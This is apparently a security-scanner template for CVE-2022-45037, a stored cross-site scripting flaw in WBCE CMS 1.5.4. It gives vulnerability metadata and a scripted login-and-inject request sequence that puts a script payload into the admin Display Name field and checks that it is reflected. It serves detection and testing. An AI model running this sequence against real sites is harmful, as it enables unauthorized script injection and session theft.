id: CVE-2022-45037
info:
  name: WBCE CMS v1.5.4 -  Cross Site Scripting (Stored)
  author: theamanrawat
  description: 'A cross-site scripting (XSS) vulnerability in /admin/users/index.php
    of WBCE CMS v1.5.4 allows attackers to execute arbitrary web scripts or HTML via
    a crafted payload injected into the Display Name field.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Upgrade to the latest version of WBCE CMS or apply the necessary patches
    provided by the vendor to fix the Cross Site Scripting vulnerability.

    '
  reference:
  - https://github.com/WBCE/WBCE_CMS
  - https://shimo.im/docs/dPkpKPQEjXfvYoqO/read
  - https://nvd.nist.gov/vuln/detail/CVE-2022-45037
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2022-45037
    cwe-id: CWE-79
    epss-score: 0.00092
    epss-percentile: 0.37956
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.4:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 5
    vendor: wbce
    product: wbce_cms
  tags: cve,cve2022,xss,wbce,cms,authenticated
traps:
- request:
    method: GET
    path: /admin/login/index.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /admin/login/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'url=&username_fieldname={{username_fieldname}}&password_fieldname={{password_fieldname}}&{{username_fieldname}}={{username}}&{{password_fieldname}}={{password}}&submit=Login

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/users/index.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /admin/users/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'formtoken={{formtoken}}&user_id=&username_fieldname={{username_fieldname_2}}&{{username_fieldname_2}}=test-{{randstr}}&password={{randstr}}&password2=&display_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email={{randstr}}%40gmail.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/users/
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>SESSION_TIMEOUT
